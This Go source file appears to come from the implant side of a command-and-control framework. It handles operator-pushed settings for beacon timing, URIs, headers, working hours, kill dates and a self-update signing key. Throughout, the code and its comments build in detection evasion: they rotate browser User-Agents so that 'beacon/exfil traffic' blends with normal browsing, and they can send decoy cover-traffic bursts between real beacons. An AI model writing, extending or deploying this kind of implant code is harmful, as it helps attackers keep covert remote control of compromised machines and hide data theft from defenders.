//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"strconv"
	"strings"
	"sync"
	"time"
)

type ConfigOverride struct {
	Sleep        int               `json:"sleep"`
	Jitter       int               `json:"jitter"`
	UserAgent    string            `json:"user_agent"`
	Headers      map[string]string `json:"headers"`
	BeaconURI    string            `json:"beacon_uri"`
	Method       string            `json:"method"`
	WorkingStart string            `json:"working_start,omitempty"`
	WorkingEnd   string            `json:"working_end,omitempty"`
	WorkingTZ    string            `json:"working_tz,omitempty"`
	CoverTraffic bool              `json:"cover_traffic,omitempty"`
	CoverTrafficMax int            `json:"cover_traffic_max,omitempty"`
	// UpdatePubKey pins the self_update signing key (hex ed25519 public).
	// Delivered over the encrypted session and persisted locally; without it
	// the agent refuses self_update entirely.
	UpdatePubKey string `json:"update_pub_key,omitempty"`
}

var configOverrides struct {
	sync.RWMutex
	sleep     int // 0 = not set
	jitter    int // 0 = not set
	userAgent string
	headers   map[string]string
	beaconURI string
	method    string
	hasSleep  bool
	hasJitter bool
	coverTraffic    bool
	coverTrafficMax int
}

func handleConfigPush(task Task, res *TaskResult) {
	if task.Data == "" {
		res.Error = "config_push: empty data"
		return
	}
	var cfg ConfigOverride
	if err := json.Unmarshal([]byte(task.Data), &cfg); err != nil {
		res.Error = "config_push: invalid json: " + err.Error()
		return
	}
	configOverrides.Lock()
	defer configOverrides.Unlock()
	if cfg.Sleep > 0 {
		IntervalStr = strconv.Itoa(cfg.Sleep)
	}
	if cfg.Jitter > 0 {
		JitterStr = strconv.Itoa(cfg.Jitter)
	}
	if cfg.UserAgent != "" {
		configOverrides.userAgent = cfg.UserAgent
	}
	if cfg.Headers != nil {
		normalized := make(map[string]string, len(cfg.Headers))
		for k, v := range cfg.Headers {
			normalized[strings.TrimSpace(k)] = v
		}
		configOverrides.headers = normalized
	}
	if cfg.BeaconURI != "" {
		configOverrides.beaconURI = cfg.BeaconURI
	}
	if cfg.Method != "" {
		configOverrides.method = strings.ToUpper(cfg.Method)
	}
	if cfg.WorkingStart != "" || cfg.WorkingEnd != "" || cfg.WorkingTZ != "" {
		wh := getWorkingHours()
		if cfg.WorkingStart != "" {
			wh.start = cfg.WorkingStart
		}
		if cfg.WorkingEnd != "" {
			wh.end = cfg.WorkingEnd
		}
		if cfg.WorkingTZ != "" {
			wh.tz = cfg.WorkingTZ
		}
		setWorkingHours(wh.start, wh.end, wh.tz)
	}
	if cfg.CoverTraffic {
		configOverrides.coverTraffic = true
	}
	if cfg.CoverTrafficMax > 0 {
		configOverrides.coverTrafficMax = cfg.CoverTrafficMax
	}
	if cfg.UpdatePubKey != "" {
		key := strings.ToLower(strings.TrimSpace(cfg.UpdatePubKey))
		if !isHex64(key) {
			res.Error = "config_push: invalid update_pub_key (want 64 hex chars)"
			return
		}
		updatePinnedPubKeyHex = key
		persistUpdatePubKey(key)
	}
	// Re-derive the typed globals (Interval/Jitter/etc.) from the canonical
	// string config so the overrides take effect and survive a later reparse.
	reparseNetworkConfig()
	res.Output = "config applied"
}

// isHex64 verifies a 64-character lowercase/uppercase hex string.
func isHex64(s string) bool {
	if len(s) != 64 {
		return false
	}
	for _, c := range s {
		if !(c >= '0' && c <= '9' || c >= 'a' && c <= 'f' || c >= 'A' && c <= 'F') {
			return false
		}
	}
	return true
}

func getActiveSleep() int {
	configOverrides.RLock()
	defer configOverrides.RUnlock()
	if configOverrides.hasSleep {
		return configOverrides.sleep
	}
	return Interval
}

func getActiveJitter() int {
	configOverrides.RLock()
	defer configOverrides.RUnlock()
	if configOverrides.hasJitter {
		return configOverrides.jitter
	}
	return Jitter
}

// defaultUserAgentPool is a curated set of realistic browser User-Agents. A
// fixed UA is a stable network fingerprint defenders key on; rotating among
// common, legitimate UAs makes beacon/exfil traffic blend with normal browser
// activity. The operator-configured UA is always prepended so explicit profile
// intent is still honored on a fraction of requests.
var defaultUserAgentPool = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
}

// randomUserAgent returns a UA drawn from the configured UA plus the built-in
// pool. Called on every outbound request so no two beacons/exfils share a
// static UA. math/rand is concurrency-safe and requires no explicit seeding.
func randomUserAgent() string {
	configOverrides.RLock()
	base := UserAgent
	if configOverrides.userAgent != "" {
		base = configOverrides.userAgent
	}
	configOverrides.RUnlock()
	pool := append([]string{base}, defaultUserAgentPool...)
	return pool[rand.Intn(len(pool))]
}

func getActiveUserAgentFromConfig() string {
	return randomUserAgent()
}

// getActiveCoverTraffic reports whether cover-traffic (decoy request bursts
// between real beacons) is enabled and the maximum decoys per burst. Off by
// default; operators opt in via the config task.
func getActiveCoverTraffic() (bool, int) {
	configOverrides.RLock()
	defer configOverrides.RUnlock()
	max := configOverrides.coverTrafficMax
	if max <= 0 {
		max = 3
	}
	return configOverrides.coverTraffic, max
}

func getActiveHeaders() map[string]string {
	configOverrides.RLock()
	defer configOverrides.RUnlock()
	if configOverrides.headers != nil {
		out := make(map[string]string, len(configOverrides.headers))
		for k, v := range configOverrides.headers {
			out[k] = v
		}
		return out
	}
	return nil
}

func getActiveBeaconURIFromConfig() string {
	configOverrides.RLock()
	uri := configOverrides.beaconURI
	configOverrides.RUnlock()
	if uri != "" {
		return uri
	}
	return getActiveBeaconURI()
}

// beaconWSURI returns the WebSocket beacon path for the configured URI. The
// HTTP beacon endpoint (POST /api/v1/beacon) and the WebSocket beacon endpoint
// (GET /ws/beacon) are the same logical contract on different server routes;
// a URI authored for one transport is mapped to the other so a WSS primary
// transport never dials the HTTP path (handshake fails) and the HTTP fallback
// never posts to the WS-only path (404).
func beaconWSURI() string {
	uri := getActiveBeaconURIFromConfig()
	if uri == "" || uri == "/api/v1/beacon" {
		return "/ws/beacon"
	}
	return uri
}

// beaconHTTPURI is the inverse of beaconWSURI: it maps a WebSocket-authored
// URI back to the HTTP POST route for the HTTPS fallback transport.
func beaconHTTPURI() string {
	uri := getActiveBeaconURIFromConfig()
	if uri == "/ws/beacon" {
		return "/api/v1/beacon"
	}
	return uri
}

func getActiveBeaconMethodFromConfig() string {
	configOverrides.RLock()
	method := configOverrides.method
	configOverrides.RUnlock()
	if method != "" {
		return method
	}
	return getActiveBeaconMethod()
}

func handleSetKillDate(task Task, res *TaskResult) {
	if task.Command == "" {
		res.Error = "set_kill_date: empty date"
		return
	}
	kd, err := time.Parse("2006-01-02", task.Command)
	if err != nil {
		res.Error = "set_kill_date: invalid date format: " + err.Error()
		return
	}
	killDateParsed = kd
	res.Output = "kill date set: " + task.Command
}

func handleClearKillDate(task Task, res *TaskResult) {
	killDateParsed = time.Time{}
	res.Output = "kill date cleared"
}

func handleSetWorkingHours(task Task, res *TaskResult) {
	if task.Data == "" {
		res.Error = "set_working_hours: empty data"
		return
	}
	var cfg struct {
		WorkingStart string `json:"working_start"`
		WorkingEnd   string `json:"working_end"`
		WorkingTZ    string `json:"working_tz"`
	}
	if err := json.Unmarshal([]byte(task.Data), &cfg); err != nil {
		res.Error = "set_working_hours: invalid json: " + err.Error()
		return
	}
	if cfg.WorkingStart != "" || cfg.WorkingEnd != "" || cfg.WorkingTZ != "" {
		wh := getWorkingHours()
		if cfg.WorkingStart != "" {
			wh.start = cfg.WorkingStart
		}
		if cfg.WorkingEnd != "" {
			wh.end = cfg.WorkingEnd
		}
		if cfg.WorkingTZ != "" {
			wh.tz = cfg.WorkingTZ
		}
		setWorkingHours(wh.start, wh.end, wh.tz)
	}
	cur := getWorkingHours()
	res.Output = fmt.Sprintf("working hours set: %s-%s (tz=%s)", cur.start, cur.end, cur.tz)
}
